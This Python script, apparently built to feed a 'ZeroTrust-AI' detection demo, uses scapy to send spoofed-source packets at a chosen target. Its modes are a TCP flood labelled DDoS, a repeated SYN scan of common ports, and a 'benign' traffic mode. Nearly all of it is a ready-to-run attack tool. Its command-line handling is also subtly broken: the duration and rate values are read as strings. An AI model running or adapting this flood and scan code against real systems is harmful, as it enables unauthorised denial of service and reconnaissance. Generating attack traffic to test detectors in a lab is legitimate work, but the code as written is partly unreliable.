#!/usr/bin/env python3
"""
Simple Attack Script for ZeroTrust-AI Demo
Run this on the attacking laptop
"""

import time
import socket
import threading
import random
from scapy.all import IP, TCP, UDP, send
import argparse

class SimpleAttacker:
    def __init__(self, target_ip, attacker_ip="192.168.137.50"):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.running = False
        
    def ddos_attack(self, duration=30, packets_per_second=100):
        """Launch DDoS attack"""
        print(f"🚨 Starting DDoS Attack: {packets_per_second} packets/sec for {duration}s")
        print(f"🎯 Target: {self.target_ip}")
        
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            try:
                # Create large packets (1500 bytes)
                packet = IP(dst=self.target_ip, src=self.attacker_ip) / \
                         TCP(dport=80, sport=random.randint(1024, 65535)) / \
                         b"A" * 1400
                
                send(packet, verbose=0)
                packet_count += 1
                
                # Control packet rate
                time.sleep(1.0 / packets_per_second)
                
                if packet_count % 100 == 0:
                    print(f"📦 Sent {packet_count} packets...")
                    
            except Exception as e:
                print(f"❌ Error sending packet: {e}")
                break
        
        print(f"✅ DDoS attack completed: {packet_count} packets sent")
    
    def benign_traffic(self, duration=30):
        """Send benign traffic"""
        print(f"🌐 Sending benign traffic for {duration}s")
        print(f"🎯 Target: {self.target_ip}")
        
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            try:
                # Normal web browsing patterns
                packet_sizes = [64, 128, 256, 512, 1024, 1500]
                size = random.choice(packet_sizes)
                
                packet = IP(dst=self.target_ip, src=self.attacker_ip) / \
                         TCP(dport=80, sport=random.randint(1024, 65535)) / \
                         b"HTTP_REQUEST" * (size // 13)
                
                send(packet, verbose=0)
                packet_count += 1
                
                # Random delays like real browsing
                time.sleep(random.uniform(0.1, 2.0))
                
                if packet_count % 20 == 0:
                    print(f"🌐 Sent {packet_count} benign packets...")
                    
            except Exception as e:
                print(f"❌ Error sending benign packet: {e}")
                break
        
        print(f"✅ Benign traffic completed: {packet_count} packets sent")
    
    def port_scan(self, duration=20):
        """Port scan attack"""
        print(f"🔍 Starting port scan for {duration}s")
        print(f"🎯 Target: {self.target_ip}")
        
        start_time = time.time()
        ports_scanned = 0
        
        # Common ports to scan
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 8080, 8443]
        
        while time.time() - start_time < duration:
            try:
                for port in common_ports:
                    # Create SYN packet for port scanning
                    packet = IP(dst=self.target_ip, src=self.attacker_ip) / \
                             TCP(dport=port, sport=random.randint(1024, 65535), flags="S")
                    
                    send(packet, verbose=0)
                    ports_scanned += 1
                    
                    # Small delay between scans
                    time.sleep(0.1)
                    
                    if ports_scanned % 50 == 0:
                        print(f"🔍 Scanned {ports_scanned} ports...")
                
                # Add delay between full scans
                time.sleep(2)
                
            except Exception as e:
                print(f"❌ Error scanning port: {e}")
                break
        
        print(f"✅ Port scan completed: {ports_scanned} ports scanned")

def main():
    parser = argparse.ArgumentParser(description="ZeroTrust-AI Simple Attacker")
    parser.add_argument("--target", "-t", required=True, help="Target IP address")
    parser.add_argument("--attacker", "-a", default="192.168.137.50", help="Attacker IP")
    parser.add_argument("--attack", choices=["ddos", "benign", "scan"], 
                       required=True, help="Attack type")
    parser.add_argument("--duration", "-d", default=30, help="Attack duration in seconds")
    parser.add_argument("--rate", "-r", default=100, help="Packets per second for DDoS")
    
    args = parser.parse_args()
    
    attacker = SimpleAttacker(args.target, args.attacker)
    
    print(f"🎭 ZeroTrust-AI Simple Attacker")
    print(f"🎯 Target: {args.target}")
    print(f"👹 Attacker: {args.attacker}")
    print(f"⚔️  Attack Type: {args.attack}")
    print(f"⏱️  Duration: {args.duration}s")
    print("=" * 50)
    
    try:
        if args.attack == "ddos":
            attacker.ddos_attack(args.duration, args.rate)
        elif args.attack == "benign":
            attacker.benign_traffic(args.duration)
        elif args.attack == "scan":
            attacker.port_scan(args.duration)
        
    except KeyboardInterrupt:
        print("\n🛑 Attack stopped by user")

if __name__ == "__main__":
    main()
